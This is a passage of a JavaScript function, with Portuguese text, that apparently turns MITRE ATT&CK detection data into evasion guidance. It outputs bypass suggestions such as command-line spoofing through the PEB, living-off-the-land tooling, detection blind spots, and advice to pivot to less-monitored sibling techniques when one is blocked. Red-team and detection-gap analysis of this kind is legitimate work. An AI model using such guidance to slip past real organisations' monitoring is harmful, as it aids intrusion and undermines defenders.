    bypasses.push('Reduzir a assinatura comportamental combinando ferramentas nativas do sistema (Living-off-the-Land), ofuscação de argumentos de linha de comando (Command-Line Spoofing via modificação do `PEB->ProcessParameters->CommandLine`) e rotação para sub-técnicas irmãs menos monitorizadas.');
  }

  // Extrair pontos cegos reais dos Analytics (x_mitre_mutable_elements)
  const blindSpots = [];
  for (const det of detections) {
    for (const an of (det.analytics || [])) {
      for (const me of (an.mutableElements || [])) {
        blindSpots.push(`**${me.field}**: ${me.description}`);
      }
    }
  }

  const siblingNote = siblings && siblings.length > 0
    ? `Caso o vetor principal \`${technique.id}\` esteja bloqueado, pivote diretamente para as variantes táticas relacionadas: ${siblings.slice(0, 5).map(s => `\`${s.id}\` (${s.name})`).join(', ')}.`
    : '';

  return {
    blockers: [...new Set(blockers)].slice(0, 4),
    bypasses: [...new Set(bypasses)].slice(0, 4),
    blindSpots: [...new Set(blindSpots)].slice(0, 5),
    siblingPivotNote: siblingNote,
    isCloud,
    isAD
  };
}
